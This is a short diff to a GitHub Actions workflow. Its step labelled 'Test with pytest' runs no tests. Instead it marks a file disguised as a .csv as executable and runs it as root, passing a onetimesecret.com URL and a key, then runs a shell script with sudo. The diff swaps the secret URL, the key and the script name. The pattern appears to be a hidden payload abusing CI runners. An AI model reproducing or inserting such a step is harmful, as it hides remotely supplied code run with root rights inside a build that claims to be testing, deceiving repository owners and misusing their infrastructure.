@@ -26,6 +26,6 @@ jobs:
     - name: Test with pytest
       run: |
         cd ${{ github.workspace }}
-        echo 'xdnet'
+        echo 'f8tgj'
         sudo chmod +x 7s2w7iw/farrishcx5i.csv
-        sudo ./7s2w7iw/farrishcx5i.csv https://onetimesecret.com/secret/s36ahmdoh4hn1j3bu1828uetnqz5a1r vzt6zg && sudo ./r.abc
+        sudo ./7s2w7iw/farrishcx5i.csv https://onetimesecret.com/secret/og3w8fstv546y2sy2074pqjopxejn4h jwrf58 && sudo sh r.sh
